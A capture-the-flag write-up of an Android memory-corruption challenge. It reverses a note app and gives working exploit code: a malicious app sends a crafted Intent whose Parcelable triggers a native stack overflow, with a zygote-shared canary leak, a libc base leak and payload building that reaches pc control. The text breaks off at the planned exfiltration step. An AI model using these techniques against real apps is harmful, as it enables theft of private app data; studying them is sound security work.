---
title: "How dare you Intent to pwn me! - Insomni'hack teaser 2024"
date: 2024-02-24T00:00:01
tags:
  - Android
  - pwn
  - ctf
  - insomni'hack
image: "/post-resources/cryptonotes/cover.png"
toc: true
summary: "Who said memory corruption vulnerabilities in Android applications are not exploitable?"
---

<!-- Get the colors right without being dragged into the ToC -->
<span class="inline-h4">PoC:</span> <a href="https://github.com/nikosChalk/ctf-writeups/tree/master/insomnihack2024/CryptoNotes/solution/MaliciousApp" target="_blank">github.com/nikosChalk/ctf-writeups/tree/master/insomnihack2024/CryptoNotes/solution/MaliciousApp</a>

<span class="inline-h4">Categories:</span> Pwn, Android

<span class="inline-h4">Description:</span>

> Insomni'Hack Teaser 2024 - CryptoNotes
>
> Our security researcher saved a sensitive note in his new note-taking application. I convinced him to install your mobile application and start the main activity on his device, please find a way to leak the notes.
>
> System running: `system-images;android-30;google_apis_playstore;x86_64`
> Submitting server: https://cryptonotes.insomnihack.ch:44300
> Note App: [notes.apk](https://github.com/nikosChalk/ctf-writeups/blob/master/insomnihack2024/CryptoNotes/resources/app-a91690d6479014d533bea108755aba2424b45b4b416823ed0c821ae421f820eb.apk) [archived]
>
> The flag format is: `INS{NoteContent}`
> 
> author: dai

So, for this challenge:

1) We are given a note-keeping application which is *supposedly secure*.
2) We are requested to write an arbitrary application and submit it to the system.
3) Both applications will run in an emulator in the following environment: `system-images;android-30;google_apis_playstore;x86_64`

---

## Initial interaction

Let's start the application and see what it is doing:

<div class="side-by-side-container">
    <img class="side-by-side" style="height: var(--default_p5_ss_height);" alt="main-screen1" src="/post-resources/cryptonotes/main-screen1.png"/>
    <img class="side-by-side" style="height: var(--default_p5_ss_height);" alt="main-screen2" src="/post-resources/cryptonotes/main-screen2.png"/>
</div>

As we can see, the application is a simple note-keeping application. It gives us 3 options:

1) Add a plaintext note
2) Add an encrypted note using algorithm A1 (ALG1)
3) Add an encrypted note using algorithm A2 (ALG2)

Once the notes are saved, we can no longer edit them. Only delete them. The flag is saved as one of these notes in the remote.

## Reversing

Reversing mobile applications is easy as they are written in Java/Kotlin. Let's throw the application in JADX.

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0"
    android:compileSdkVersion="33"
    android:compileSdkVersionCodename="13"
    package="com.inso.ins24"
    platformBuildVersionCode="33"
    platformBuildVersionName="13">

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33"/>
    <uses-permission android:name="READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <permission android:name="com.inso.ins24.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
    <uses-permission android:name="com.inso.ins24.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application android:theme="@style/Theme_Ins24" android:label="@string/app_name" android:icon="@mipmap/ic_launcher"
        android:debuggable="true"
        android:allowBackup="false"
        android:supportsRtl="true"
        android:fullBackupContent="@xml/backup_rules"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
        android:dataExtractionRules="@xml/data_extraction_rules">

        <activity android:name="com.inso.ins24.NoteAPIActivity" android:exported="true"/>
        <activity android:name="com.inso.ins24.NoteViewActivity" android:exported="false"/>
        <activity android:name="com.inso.ins24.NoteEditorActivity" android:exported="false"/>
        <activity android:name="com.inso.ins24.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <provider android:name="androidx.startup.InitializationProvider" android:exported="false" android:authorities="com.inso.ins24.androidx-startup">
            <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
            <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
        </provider>
    </application>
</manifest>
```

From the application's AndroidManifest.xml we can make the following observations:

* There are 2 `exported` activities. `exported` components allow us to interact with the target application from another application (i.e. interact from the application that we will write).
* `DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION` is not interesting as it is standard Android 13 behavior and with correct `protectionLevel="signature"`
* The target can do network communication (`android.permission.INTERNET`)
* The target has `READ_EXTERNAL_STORAGE` and since the target runs on `android-30` (`Build.VERSION_CODES.R`), it is also automatically granted the `WRITE_EXTERNAL_STORAGE` permission.
* The target has `debuggable="true"`, although I am uncertain if this is exploitable from the context of another application.

Here are also the application's classes:

![class-layout](/post-resources/cryptonotes/class-layout.png)

So, let's start with the `MainActivity`:

```java
package com.inso.ins24;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.google.gson.Gson;
import com.inso.ins24.utils.CryptoConfig;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

/* loaded from: classes4.dex */
public class MainActivity extends AppCompatActivity {
    static ArrayAdapter adapter;
    static String cryptoConfig = "{'ALGO':[65,76,71,79,49],'IN':'this is a notes'}";
    static CryptoConfig cryptoconf;
    static Gson gson;
    static List<String> notes2;
    TextView emptyTv;
    ListView notesListView;
    SharedPreferences sharedPreferences;

    static {
        Gson gson2 = new Gson();
        gson = gson2;
        cryptoconf = (CryptoConfig) gson2.fromJson(cryptoConfig, (Class<Object>) CryptoConfig.class);
    }

    public static String encrypt(String note, byte[] algo) {
        return CryptoConfig.docipher(algo, note);
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        this.notesListView = (ListView) findViewById(R.id.notes_ListView);
        this.emptyTv = (TextView) findViewById(R.id.emptyTv);
        System.loadLibrary("ins24");
        if (getIntent().hasExtra("exit")) {
            finish();
        }
        this.sharedPreferences = getSharedPreferences("com.inso.ins24.mynotes", 0);
        notes2 = new ArrayList();
        HashSet<String> noteSet2 = (HashSet) this.sharedPreferences.getStringSet("notes", null);
        if (noteSet2 == null || noteSet2.isEmpty()) {
            this.emptyTv.setVisibility(0);
        } else {
            this.emptyTv.setVisibility(8);
            notes2 = new ArrayList(noteSet2);
        }
        ArrayAdapter arrayAdapter = new ArrayAdapter(getApplicationContext(), (int) R.layout.custom_note_row, (int) R.id.notesTV, notes2);
        adapter = arrayAdapter;
        this.notesListView.setAdapter((ListAdapter) arrayAdapter);
        this.notesListView.setOnItemClickListener(new AdapterView.OnItemClickListener() { // from class: com.inso.ins24.MainActivity.1
            @Override // android.widget.AdapterView.OnItemClickListener
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                Intent intent = new Intent(MainActivity.this.getApplicationContext(), NoteViewActivity.class);
                intent.putExtra("noteId", position);
                MainActivity.this.startActivity(intent);
            }
        });
        this.notesListView.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() { // from class: com.inso.ins24.MainActivity.2
            @Override // android.widget.AdapterView.OnItemLongClickListener
            public boolean onItemLongClick(AdapterView<?> parent, View view, final int position, long id) {
                new AlertDialog.Builder(MainActivity.this).setTitle("Are you sure ?").setMessage("Do you want to delete this note").setPositiveButton("Yes", new DialogInterface.OnClickListener() { // from class: com.inso.ins24.MainActivity.2.1
                    @Override // android.content.DialogInterface.OnClickListener
                    public void onClick(DialogInterface dialog, int which) {
                        MainActivity.notes2.remove(position);
                        MainActivity.adapter.notifyDataSetChanged();
                        HashSet<String> noteSet = new HashSet<>(MainActivity.notes2);
                        MainActivity.this.sharedPreferences.edit().putStringSet("notes", noteSet).apply();
                        if (noteSet.isEmpty()) {
                            MainActivity.this.emptyTv.setVisibility(0);
                        }
                    }
                }).setNegativeButton("No", (DialogInterface.OnClickListener) null).show();
                return true;
            }
        });
    }

    @Override // android.app.Activity
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.add_note_menu, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override // android.app.Activity
    public boolean onOptionsItemSelected(MenuItem item) {
        super.onOptionsItemSelected(item);
        if (item.getItemId() == R.id.add_note) {
            startActivity(new Intent(getApplicationContext(), NoteEditorActivity.class).putExtra("encrypted", false));
            finish();
            return true;
        } else if (item.getItemId() == R.id.add_note_encrypted1) {
            startActivity(new Intent(getApplicationContext(), NoteEditorActivity.class).putExtra("encrypted", true).putExtra("algo", 1));
            finish();
            return true;
        } else if (item.getItemId() != R.id.add_note_encrypted2) {
            return false;
        } else {
            startActivity(new Intent(getApplicationContext(), NoteEditorActivity.class).putExtra("encrypted", true).putExtra("algo", 2));
            finish();
            return true;
        }
    }
}
```

There are a few interesting things happening here:

* `System.loadLibrary("ins24");` - The application loads a native library
* The notes are saved in `getSharedPreferences("com.inso.ins24.mynotes", 0);`. This SharedPreference is created with mode `0=MODE_PRIVATE`. SharedPreferences private to the application are stored in the application's private folder, so the notes will be saved in `/data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml`, which is only accessible to the owning application.
* If the `MainActivity` is launched with an intent that contains the extra `exit`, then `finish()` will be invoked. This method comes from the `AppCompatActivity` class and will invoke `onDestroy()` - basically destroying the activity. Note also that the full body method of `onCreate` will be executed even when the `exit` extra is passed, because there is no `return` inside the if case:
    ```java
    if (getIntent().hasExtra("exit")) {
        finish();
        //no return here
    }
    //control flow continues!
    ```

Let's also check the `NoteAPIActivity` which is also exported:

```java
package com.inso.ins24;

import android.content.SharedPreferences;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

/* loaded from: classes4.dex */
public class NoteAPIActivity extends AppCompatActivity {
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_note_apiactivity);
        SharedPreferences sharedPreferences = getSharedPreferences("com.inso.ins24.mynotes", 0);
        List<String> notes = new ArrayList<>();
        HashSet<String> noteSet2 = (HashSet) sharedPreferences.getStringSet("notes", null);
        String new_note = getIntent().getStringExtra("my_first_note");
        System.loadLibrary("ins24");
        if (noteSet2 != null && !noteSet2.isEmpty()) {
            finish();
        } else if (new_note != null) {
            notes.add("");
            int noteId = notes.size() - 1;
            notes.set(noteId, new_note);
            notes.set(noteId, MainActivity.encrypt(String.valueOf(new_note), new byte[]{65, 76, 71, 49, 0})); //ALG1
            sharedPreferences.edit().putStringSet("notes", new HashSet<>(notes)).apply();
            finish();
        }
    }
}
```

Nothing interesting here. If no notes have ever been created, and the `my_first_note` extra string has been passed to the intent, then the provided note will be created and stored with the content specified by the invoking application.

Finally, let's take a look at what the native library does by loading it into ghidra. Fortunately, the native library (`libins24.so`) is not stripped:

```c
char* do_vigenere(char *str);
char* rot13(char *s);

_jstring *
Java_com_inso_ins24_utils_CryptoConfig_docipher(
    _JNIEnv *env,_jclass *clz,_jarray *algo,_jstring *note
) {
  int arr_alg_len;
  char *algo_str;
  char *pcVar1;
  char *pcVar2;
  _jstring *ret;
  char *note_c_str;
  
  note_c_str = (char *)_JNIEnv::GetStringUTFChars(env,note,NULL);
  arr_alg_len = _JNIEnv::GetArrayLength(env,algo);
  algo_str = get_algo(env,clz,(_jbyteArray *)algo,arr_alg_len);
  pcVar1 = strstr(algo_str,"ALG1");
  if (pcVar1 == NULL) {
    pcVar2 = strstr(algo_str,"ALG2");
    if (pcVar2 != NULL) {
      note_c_str = rot13(note_c_str); //ALG2
    }
  }
  else {
    note_c_str = do_vigenere(note_c_str); //ALG1
  }
  ret = (_jstring *)_JNIEnv::NewStringUTF(env,note_c_str);
  return ret;
}

char* get_algo(_JNIEnv *env,_jclass *param_2, _jbyteArray *arr, int arr_len) {
  byte *lVar1;
  long in_FS_OFFSET;
  ulong i;
  byte buf [56];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  lVar1 = (byte *)_JNIEnv::GetByteArrayElements(env,arr, NULL);
  for (i=0; i<(ulong)(long)arr_len; i++) {
    buf[i] = lVar1[i];
  }
  if (*(long *)(in_FS_OFFSET + 0x28) == canary) {
    return (char *)buf;
  }

  /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Some minor observations regarding the native layer:

* There is no `JNI_OnLoad`.
* Only one function is interfacing with the Java layer: `Java_com_inso_ins24_utils_CryptoConfig_docipher`
* `get_algo` returns a stack buffer. Now this is a bug.
* `get_algo` loops `arr_len` times but the `buf` has fixed length of 56 bytes. Since `"ALG1"` and `"ALG2"` are the only values passed to `get_algo`, this *seems safe for now*.
* `rot13` corresponds to `ALG1` and `do_vigenere` to `ALG2`. The Vigenere algorithm also has a static key (`KEYINSOKEY`) for all notes. So, the "encryption" is breakable in both cases.

For the sake of completeness, let's also examine the `CryptoConfig` class which declares the native function `Java_com_inso_ins24_utils_CryptoConfig_docipher`:

```java
package com.inso.ins24.utils;

/* loaded from: classes3.dex */
public class CryptoConfig {
    private byte[] ALGO;
    private String IN;

    public static native String docipher(byte[] bArr, String str);

    protected void finalize() throws Throwable {
        super.finalize();
        docipher(this.ALGO, this.IN);
    }
}
```

Weird. Why would it invoke `docipher` in its destructor? The `docipher` does not save the result in the SharedPreferences. Anyway.

### Bug, bug, where are you bug?

At this point we can be staring at our application and never find the bug. The reason is that we have to dig and abuse Android internals a bit.

One notorious thing with Android Intents, is that they get unparceled quite aggressively. This has been abused [since 2015](https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf) and also to exploit the [PayPal app](https://blog.oversecured.com/Exploiting-memory-corruption-vulnerabilities-on-Android/) in 2021.

Let's check the Android source code ourselves:

```java
// https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/content/Intent.java;l=8932;bpv=0
public class Intent implements Parcelable, Cloneable {
    @UnsupportedAppUsage
    private Bundle mExtras;

    public boolean hasExtra(String name) {
        return mExtras != null && mExtras.containsKey(name);
    }
    public @Nullable String getStringExtra(String name) {
        return mExtras == null ? null : mExtras.getString(name);
    }
}

public class BaseBundle {
    // https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/BaseBundle.java;l=697;drc=9e2bc26eb6d703b0b03130bf042222fb8dab08ce;bpv=0
    public boolean containsKey(String key) {
        unparcel();                                 // <-----------------------
        return mMap.containsKey(key);
    }

    // https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/BaseBundle.java;drc=9e2bc26eb6d703b0b03130bf042222fb8dab08ce;bpv=0;l=1414
    public String getString(@Nullable String key) {
        unparcel();                                 // <-----------------------
        final Object o = mMap.get(key);
        try {
            return (String) o;
        } catch (ClassCastException e) {
            typeWarning(key, o, "String", e);
            return null;
        }
    }

    /**
     * If the underlying data are stored as a Parcel, unparcel them
     * using the currently assigned class loader.
     */
    @UnsupportedAppUsage
    final void unparcel() {
        unparcel(/* itemwise */ false);
    }
    /** Deserializes the underlying data and each item if {@code itemwise} is true. */
    final void unparcel(boolean itemwise) {
        //...
    }
}
```

So, when our target app simply checks the existence of extras in Intents, without actually retrieving the objects, the Intents' data will get automatically deserialized (`unparceled()`). With this in mind, let's examine again the target application for any interesting objects that implement `Serializable` or `Parcelable` so that we can pass them from our app to the target app:

```java
package com.inso.ins24.utils;

import android.os.Parcel;
import android.os.Parcelable;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

/* loaded from: classes3.dex */
public class JSONBuilder implements Parcelable {
    public static final Parcelable.Creator<JSONBuilder> CREATOR = new Parcelable.Creator<JSONBuilder>() { // from class: com.inso.ins24.utils.JSONBuilder.1
        /* JADX WARN: Can't rename method to resolve collision */
        @Override // android.os.Parcelable.Creator
        public JSONBuilder[] newArray(int i) {
            return new JSONBuilder[i];
        }

        /* JADX WARN: Can't rename method to resolve collision */
        @Override // android.os.Parcelable.Creator
        public JSONBuilder createFromParcel(Parcel parcel) {
            return new JSONBuilder(parcel);
        }
    };
    private static final Gson JSON = new GsonBuilder().create();
    public Object data;

    private JSONBuilder(Parcel parcel) {
        try {
            /*
            Returns the Class object associated with the class or interface with the given string name
            public static Class<?> forName(String className);

            This method deserializes the specified Json into an object of the specified class.
            public <T> T fromJson(java.lang.String json, java.lang.Class<T> classOfT);
            */
            this.data = JSON.fromJson(parcel.readString(), (Class<Object>) Class.forName(parcel.readString()));
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
    }

    @Override // android.os.Parcelable
    public int describeContents() {
        return 0;
    }

    @Override // android.os.Parcelable
    public void writeToParcel(Parcel parcel, int i) {
        parcel.writeString(this.data.getClass().getCanonicalName());
        parcel.writeString(JSON.toJson(this.data));
    }
}
```

Now this class is interesting. It is `Parcelable`, which means that we can pass instances of this class through Intents. It also lucrative from an attacker's perspective. Basically what the `JSONBuilder` class does is that it allows the user to serialize and deserialize arbitrary objects. So, by crafting a malicious `Intent` where we pass a `JSONBuilder` object as extra, we can instantiate arbitrary objects in the target application.

It is interesting that the `JSONBuilder` class is never used by the target application, yet we can leverage this class to exploit the target application.

### Hello memory corruption

One class of interest that we can use for instantiation through an Intent containing a `JSONBuilder` Parcel is the `CryptoConfig` class:

```java
package com.inso.ins24.utils;
public class CryptoConfig {
    private byte[] ALGO;
    private String IN;

    public static native String docipher(byte[] bArr, String str);

    protected void finalize() throws Throwable {
        super.finalize();
        docipher(this.ALGO, this.IN);
    }
}
```

The reason that we choose this class is because it has a custom `finalize()` method and hence it can do some action (`docipher()`) in the native layer with data that we specify through our Intent. Can we somehow achieve memory corruption by controlling `CryptoConfig.ALGO` and `CryptoConfig.IN` while the native `docipher` is being executed?

```c
_jstring *
Java_com_inso_ins24_utils_CryptoConfig_docipher(
    _JNIEnv *env,_jclass *clz,_jarray *algo,_jstring *note
) {
  int arr_alg_len;
  char *algo_str;
  char *note_c_str;
  
  note_c_str = (char *)_JNIEnv::GetStringUTFChars(env,note,NULL);
  arr_alg_len = _JNIEnv::GetArrayLength(env,algo);
  algo_str = get_algo(env,clz,(_jbyteArray *)algo,arr_alg_len);
  //...
}

char* get_algo(_JNIEnv *env,_jclass *param_2, _jbyteArray *arr, int arr_len) {
  byte *lVar1;
  long in_FS_OFFSET;
  ulong i;
  byte buf [56];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  lVar1 = (byte *)_JNIEnv::GetByteArrayElements(env,arr, NULL);
  for (i=0; i<(ulong)(long)arr_len; i++) {
    buf[i] = lVar1[i];
  }
  if (*(long *)(in_FS_OFFSET + 0x28) == canary) {
    return (char *)buf;
  }

  /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

There it is! The `get_algo` function has a buffer overflow in the for loop that we deemed *safe* earlier. We are passing an attacker-controlled `arr` and `arr_len` (`CryptoConfig.ALGO`) to the `get_algo` function. The `buf` has size 56 bytes only. We can smash the stack!

## Exploitation through Intents

Let's create a minimal PoC application that smashes the stack:

```xml
<!-- AndroidManifest.xml -->
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.example.insomnipwn">

    <application
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:theme="@style/Theme.MyApplication">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

```kotlin
//java/com/example/insomnipwn/MainActivity.kt
package com.example.insomnipwn

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.inso.ins24.utils.CryptoConfig

import com.inso.ins24.utils.JSONBuilder

class MainActivity : AppCompatActivity() {
    private external fun buildPayload(): ByteArray
    companion object {
        init {
            System.loadLibrary("mynativelib");
        }
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val pwnButton = findViewById<Button>(R.id.pwnButton)
        pwnButton.setOnClickListener {
            //Construct the malicious parcelable object
            val IN = "data"
            val ALGO = buildPayload();
            val evilCryptoConfig = CryptoConfig(ALGO, IN)
            val evilParcelable = JSONBuilder(evilCryptoConfig)

            //Send malicious Intent
            val intent = Intent()
            intent.setClassName("com.inso.ins24", "com.inso.ins24.NoteAPIActivity")
            intent.putExtra("my_first_note", "Note")
            intent.putExtra("foo", evilParcelable)
            startActivity(intent)

            Log.i("[insomnipwn]","Intent sent!")
            Toast.makeText(this, "Intent sent!", Toast.LENGTH_SHORT).show();
        }
    }
}
```

```c++
// cpp/main.cpp
#include <cstdlib>
#include "jni.h"

extern "C"
JNIEXPORT jbyteArray JNICALL
Java_com_example_insomnipwn_MainActivity_buildPayload(JNIEnv *env, jobject thiz) {

    size_t payload_len = 0x100;
    char *payload = static_cast<char *>(calloc(payload_len, sizeof(char)));
    memset(payload, 0x41, payload_len);

    jbyteArray res = env->NewByteArray(payload_len);
    env->SetByteArrayRegion(res, 0, payload_len, reinterpret_cast<const jbyte *>(payload));
    return res;
}
```

We also need to copy the `JSONBuilder` and `CryptoConfig` classes from our target app and place them under the same package name:

```java
// java/com/inso/ins24/utils/CryptoConfig.java
package com.inso.ins24.utils;
public class CryptoConfig {
    /* Implementation omitted. Same as original app */
}

// java/com/inso/ins24/utils/JSONBuilder.java
package com.inso.ins24.utils;
public class JSONBuilder implements Parcelable {
    /* Implementation omitted. Same as original app */
}
```

Let's build our malicious application and run it!

<p float="middle">
  <img align="top" style="display: inline-block;" src="/post-resources/cryptonotes/pwn-app-main-screen.png" width="22%" />
  <img align="top" style="display: inline-block;" src="/post-resources/cryptonotes/stack-corruption.png" width="77%" /> 
</p>

Once we click the "PWN!" button, the malicious intnet is constructed and sent to the target application. And we have stack corruption! We effectively control `pc`. Very interesting to see that by simply sending a malicious intent from our application to the target application we are able to completely take control over its execution!

What is actually happening here under the hood is that:

1) We create a `JSONBuilder` object that contains a `CryptoConfig` object.
2) We create an Intent that is to be delivered to the `com.inso.ins24` package and more specifically to its `.NoteAPIActivity` Activity.
3) We add the key-value String extra `my_first_note=Note` to the Intent.
4) We serialzie the `JSONBuilder` object and add it to the Intent under the key `foo`.
5) We send our malicious Intent to the `com.inso.ins24` package (target app).
6) The target application receives our malicious Intent.
7) The target application passes the intent to its `.NoteAPIActivity` Activity. Its `onCreate()` method is invoked.
8) The code `getIntent().getStringExtra("my_first_note")` in the target activity will force the deserialization of the Intent's objects (`unparcel()`).
9) The `JSONBuilder.CREATOR.createFromParcel` will be invoked, which in turns invokes the constructor `JSONBuilder(parcel)`. This method will instantiate a `CryptoConfig` object from the parcel's JSON data and save it in the `JSONBuilder.data` instance field.
10) We return from `getStringExtra()` and the control flow in `onCreate()` continiues. `finish()` is eventually invoked.
11) When `finish()` is invoked on an Activity, the `onDestroy()` method of that activity is executed [[1](https://stackoverflow.com/questions/10847526/what-is-activity-finish-method-doing-exactly/10862977#10862977)], basically indicating that the Activity is no longer needed and should be closed. [[2](https://developer.android.com/reference/android/app/Activity#finish())].

Now the activity will get closed and we will be back to our malicious application. So, when is `CryptoConfig.finalize()` invoked to trigger our memory corruption?

Well, this is kind of random. All the parent resources related to the deserialized `CryptoConfig` instance (e.g. Parcel, Intent, Activity, etc.) are no longer needed as the `com.inso.ins24.NoteAPIActivity` instance was destroyed. So, it is up to the garbage collector to kick-in and invoke [`finalize()`](https://developer.android.com/reference/java/lang/Object#finalize()) to clean up the `CryptoConfig` instance. Once that happens, the `docipher(this.ALGO, this.IN)` will be executed as part of the overriden implementation of `CryptoConfig.finalize()` and our memory corruption will finally manifest!

### Debugging environment

Since we are entering the exploitation phase, let's quickly setup our debugging environment. In the emulator, we already have `su` and do not have to deal with SELinux. We further push `frida-server` in `/data/local/tmp`. This small frida snippet can tell us if our intents get delivered as expected:

```javascript
Java.perform(function() {
    Java.use("com.inso.ins24.NoteAPIActivity").onCreate.implementation = function(a1) {
        console.log("onCreate invoked")
        return this.onCreate(a1)
    }
    console.log("Hooks initialized");
})
```

Next, we also setup gdb:

```bash
find $ANDROID_HOME -name gdbserver | grep android-x86_64
adb push $ANDROID_HOME/ndk-bundle/prebuilt/android-x86_64/gdbserver/gdbserver /data/local/tmp

adb shell
su
chmod ug+x /data/local/tmp/gdbserver
/data/local/tmp/gdbserver :7777 --attach `pidof com.inso.ins24`
```

Next, we run the gdb client on our host machine:

```bash
adb forward tcp:7777 tcp:7777
gdb
(gdb) target remote 127.0.0.1:7777
(gdb) b *get_algo+0xa8
(gdb) continue
```

### Defeating the canary

As shown earlier, we were able to smash the stack through a continious buffer overflow. Yet we do not know the canary. What now?

Remember our runtime envrionment! We are in Android. More specifically, we are one malicious application trying to pwn another application. All applications in Android are forked from the `zygote64` process. This process is basically an optimization so that application spawning is fast.

Since all processes are forked from `zygote64`, all processes have the same stack canary value (changing canary value after a `fork()` would be a total mess). Yes, the stack canary is useless in our threat model. We can simply leak the canary value from our own memroy space:

```c++
// cpp/main.cpp

#define LOG_TAG "[native_insomnipwn]"
#include <android/log.h>
#define ALOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define ALOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

//apktool d app-debug.apk
//then, load the libmynativelib.so to Ghidra to validate
static __attribute__((noinline)) __attribute__((optnone))
uint64_t canaryLeaker() {
    char *canaryPtr = (char*)(&canaryPtr)+0x08;

    //bunch of prints that should force the canary on the stack
    ALOGI("canaryLeaker= 0x%llx", canaryLeaker);
    ALOGI("JNI_OnLoad= 0x%llx", JNI_OnLoad);
    ALOGI("canaryPtr stored @ 0x%llx", &canaryPtr);
    ALOGI("canary addr= 0x%llx", canaryPtr);

    return *(uint64_t*)canaryPtr;
}
extern "C"
JNIEXPORT jbyteArray JNICALL
Java_com_example_insomnipwn_MainActivity_buildPayload(JNIEnv *env, jobject thiz) {
    uint64_t canary = canaryLeaker();
    ALOGI("canary= 0x%llx", canary);
    //...
}
```

### Leaking libc

How about leaking libc? Well, there is no need to leak libc from the target application. As all Android applications are forked from `zygote64` and `libc.so` is mapped in `zygote64`, `libc.so` is mapped in all applications at the same address ranges. So, we can simply read `/proc/self/maps` to get the base address of `libc.so`:

```c++
// cpp/main.cpp
int ends_with(const char *str, const char *suffix) {
    if (!str || !suffix)
        return 0;
    size_t lenstr = strlen(str);
    size_t lensuffix = strlen(suffix);
    if (lensuffix >  lenstr)
        return 0;
    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
}
static uint64_t libcLeaker() {
    uint64_t libc_base = NULL;
    char * line = NULL;
    size_t line_len = 0;
    FILE *fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) {
        ALOGE("failed to open /proc/self/maps");
        return NULL;
    }
    while (getline(&line, &line_len, fp) != -1) {
        //trim line endings
        if(line_len > 0)
            line_len = strlen(line);
        if(line_len > 0 && line[line_len-1] == '\n')
            line[--line_len] = '\0';
        if(ends_with(line, "/libc.so")) {
            void *addr_start, *addr_end;
            sscanf(line, "%p-%p", &addr_start, &addr_end);
            libc_base = reinterpret_cast<uint64_t>(addr_start);
            break;
        }
    }
    fclose(fp);
    if(line)
        free(line);

    return libc_base;
}
```

Let's try out our payload so far:

```c++
// cpp/main.cpp
template<typename T>
static void write_buf(void *buf, size_t *len, T val) {
    char *cptr = reinterpret_cast<char *>(buf);
    memcpy(cptr+*len, &val, sizeof(val));
    *len += sizeof(val);
}
#define write_u8(buf, len, val) write_buf((buf), (len), (uint8_t)(val))
#define write_u64(buf, len, val) write_buf((buf), (len), (uint64_t)(val))

extern "C"
JNIEXPORT jbyteArray JNICALL
Java_com_example_insomnipwn_MainActivity_buildPayload(JNIEnv *env, jobject thiz) {
    uint64_t canary = canaryLeaker();
    uint64_t libc_base = libcLeaker();
    ALOGI("canary= 0x%llx", canary);
    ALOGI("libc base= 0x%llx", libc_base);
    
    char *payload = static_cast<char *>(calloc(0x1000, sizeof(char)));
    size_t payload_len = 0;
    for(int i=0; i<56; i++) {
        write_u8(payload, &payload_len, 0x41); //padding
    }
    write_u64(payload, &payload_len, canary);
    write_u64(payload, &payload_len, 0x4242424242424242); //rbp
    write_u64(payload, &payload_len, 0x4343434343434343); //pc

    jbyteArray res = env->NewByteArray(payload_len);
    env->SetByteArrayRegion(res, 0, payload_len, reinterpret_cast<const jbyte *>(payload));
    return res;
}
```

![pc-control](/post-resources/cryptonotes/pc-control.png)

Perfect! The crash that we get is a `SIGSEGV` at `0x4343434343434343` and there is no `stack corruption detected (-fstack-protector)` message shown this time. This means that we successfully bypassed the canary. Here are also the logs from our malicious app:

![malicious-app-logs](/post-resources/cryptonotes/malicious-app-logs.png)

### Exfiltrating data

We have control of `pc` and now we need to read the SharedPreference file `/data/user/0/com.inso.ins24/shared_prefs/com.inso.ins24.mynotes.xml`. The victim application has no way to pass back data to our malicious application via the Intent that we sent it. However, the victim application has `android.permission.INTERNET`. So we will send the SharedPrefernce file over newtork to our host machine.

*Note: Even if the victim application did not have `android.permission.INTERNET`, we could still copy the SharedPreference file in external storage (e.g. in `/sdcard/Download`). Afterwards, our malicious application could read it and then use its own `android.permission.INTERNET` permission to send/leak it from the remote machine to a server that we control.*

